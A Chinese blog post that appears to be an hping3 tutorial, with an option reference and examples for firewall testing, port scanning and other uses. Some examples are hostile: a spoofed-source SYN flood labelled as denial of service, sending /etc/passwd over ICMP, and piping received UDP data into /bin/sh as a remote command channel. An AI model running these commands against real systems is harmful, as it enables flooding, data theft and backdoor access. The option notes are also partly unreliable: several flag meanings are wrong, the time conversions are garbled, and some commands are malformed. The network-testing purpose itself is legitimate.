---
title: linux命令hping3
date: 2020-12-11 10:08:06
categories: [linux,]  
tags: [linuxcc,linux]
---


<!-- more -->   

# linux命令hping3
hping是安全审计、防火墙测试等工作的标配工具。`hping优势在于能够定制数据包的各个部分`，因此用户可以灵活对目标机进行细致地探测。

安装
```bash
yum install hping3 -y
```


## 功能

> 参数

```bash
-h --help 显示帮助信息
-v --version 显示Hping的版本信息
-c --count 指定数据包的次数
-i --interval 指定发包间隔为多少毫秒，如-i m10：表示发包间隔为10毫秒(附:秒、毫秒、微秒进率。1s=1000ms(毫秒)=1000000(微秒)，1s=103ms(毫秒)=106μs(微秒))
–fast 与-i m100等同，即每秒钟发送10个数据包(hping的间隔u表示微妙，－－fast表示快速模式，一秒10个包。)
-n --numeric 指定以数字形式输出,表示不进行名称解析。
-q --quiet 退出Hping
-I --interface 指定IP，如本机有两块网卡，可通过此参数指定发送数据包的IP地址。如果不指定则默认使用网关IP
-V --verbose 详细模式,一般显示很多包信息。
-D --debug 定义hping使用debug模式。
-z --bind 将ctrl+z 绑定到ttl，默认使用DST端口
-Z --unbind 解除ctrl+z的绑定

指定所用的模式：
(缺省使用TCP进行PING处理)
-0 --rawip 裸IP方式,使用RAWSOCKET方式。
-1 --icmp ICMP 模式
-2 --udp UDP 模式
-8 --scan 扫描模式. (例: hping --scan 1-30,70-90 -S www.target.host)
-9 --listen 监听模式，会接受指定的信息。侦听指定的信息内容。

IP选项：

-a --spoof 源地址欺骗
–rand-dest 随机目的地址模式
–rand-source 随机源目的地址模式
-t --ttl ttl值，默认为64
-N --id 指定id，默认是随机的
-W --winid 使用win*的id 字节顺序,针对不同的操作系统。
-r --rel 相对的id区域
-f --frag 将数据包分片后传输(可以通过薄弱的acl(访问控制列表))
-x --morefrag 设置更多的分片标记
-y --dontfrag 设置不加分片标记
-g --fragoff 设置分片偏移
-m --mtu 设置虚拟MTU, 当数据包>MTU时要使用–frag 进行分片
-o --tos 指定服务类型，默认是0x00,，可以使用–tos help查看帮助
-G --rroute 包含RECORD_ROUTE选项并且显示路由缓存
–lsrr 释放源路记录
–ssrr 严格的源路由记录
-H --ipproto 设置协议范围，仅在RAW IP模式下使用

ICMP选项

-C --icmptype 指定icmp类型（默认类型为回显请求）
-K --icmpcode 指定icmp编码（默认为0）
–force-icmp 发送所有ICMP数据包类型（默认只发送可以支持的类型） --icmp-gw 针对ICMP数据包重定向设定网关地址（默认是0.0.0.0）
–icmp-ts 相当于–icmp --icmptype 13（ICMP时间戳）
–icmp-addr 相当于–icmp --icmptype 17（ICMP地址掩码）
–icmp-help 显示ICMP的其它帮助选项

UDP/TCP选项

-s --baseport 基本源端口（默认是随机的）
-p --destport 目的端口（默认为0），可同时指定多个端口
-k --keep 仍然保持源端口
-w --win 指定数据包大小，默认为64
-O --tcpoff 设置假的TCP数据偏移
-Q --seqnum 仅显示TCP序列号
-b --badcksum 尝试发送不正确IP校验和的数据包(许多系统在发送数据包时使用固定的IP校验和，因此你会得到不正确的UDP/TCP校验和.)
-M --setseq 设置TCP序列号
-L --setack 使用TCP的ACK（访问控制列表）
-F --fin 使用FIN标记set FIN flag
-S --syn 使用SNY标记
-R --rst 使用RST标记
-P --push 使用PUSH标记
-A --ack 使用 ACK 标记
-U --urg 使用URG标记
-X --xmas 使用 X 未用标记 (0x40)
-Y --ymas 使用 Y 未用标记 (0x80)
–tcpexitcode 最后使用 tcp->th_flags 作为退出代码
–tcp-timestamp 启动TCP时间戳选项来猜测运行时间

常规选项

-d --data 数据大小，默认为0
-E --file 从指定文件中读取数据
-e --sign 增加签名
-j --dump 以十六进行形式转存数据包
-J --print 转存可输出的字符
-B --safe 启用安全协议
-u --end 当通过- -file指定的文件结束时停止并显示，防止文件再从头开始
-T --traceroute 路由跟踪模式
–tr-stop 在路由跟踪模式下当收到第一个非ICMP数据包时退出
–tr-keep-ttl 保持源TTL，对监测一个hop有用
–tr-no-rtt 使用路由跟踪模式时不计算或显示RTT信息

ARS数据包描述(新增加的内容，暂时还不稳定)
–apd-send 发送用描述APD的数据包

```

> 防火墙测试

- -S 表示只发送SYN包, 也就是握手协议中的请求包
- -c 表示发包的数量
- -a hostname 表示伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了
- -p 表示目的端口
```bash
hping3 -S  -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10
```

> 端口扫描

- -I eth0指定使用eth0端口
- -S指定TCP包的标志位SYN
- -p 80指定探测的目的端口
```bash
hping3 -I eth0  -S 192.168.10.1 -p 80
```

> 拒绝服务攻击

- -I 指定网卡
- -a 伪造ip
- -S 发送syn包
- -p 指定目的端口
- -i 指定发送间隔的时间 u1000表示1000微秒
```bash
hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000
```

> 文件传输

- --listen 表示监听指定内容,这里表示监听signature的内容
- 
```bash
# 接收端
hping3 192.168.1.159--listen signature --safe  --icmp
# 发送端
hping3 192.168.1.108--icmp ?d 100 --sign signature --file /etc/passwd
```

> 发送程序

```bash
# 接收端
hping3 192.168.10.66--listen signature --safe --udp -p 53 | /bin/sh
# 发送端
echo ls >test.cmd
hping3 192.168.10.44 -p53 -d 100 --udp --sign signature --file ./test.cmd
```


https://mochazz.github.io/2017/07/23/hping3/#ICMP-Flood%E6%94%BB%E5%87%BB
https://zhuanlan.zhihu.com/p/123226453